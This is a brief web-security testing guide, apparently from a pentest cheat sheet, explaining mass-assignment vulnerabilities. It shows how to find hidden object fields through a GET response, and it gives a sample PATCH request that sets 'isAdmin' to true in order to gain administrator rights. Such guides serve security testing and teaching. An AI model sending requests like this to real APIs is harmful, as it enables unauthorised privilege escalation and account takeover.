# Mass Assignment

Mass assignment (also known as auto-binding) can inadvertently create hidden parameters. It occurs when software frameworks automatically bind request parameters to fields on an internal object. Mass assignment may therefore result in the application supporting parameters that were never intended to be processed by the developer.



## Identifying hidden parameters

Since mass assignment creates parameters from object fields, you can often identify these hidden parameters by manually examining objects returned by the API.

Try to get object's information from the GET API endpoints.

```
GET /api/users/123
{
    "id": 123,
    "name": "John Doe",
    "email": "john@example.com",
    "isAdmin": "false"
}
```



## Testing mass assignment

Try to change the method to `POST` or `PATCH /api/users/` request, which enables users to update their username and email, and includes the following JSON adding the `isAdmin` parameter to true:

```
PATCH /api/users/
{
    "id": "123",
    "email": "pwned@example.com",
    "isAdmin": true
}
```

If it works, we are now administror of the page.
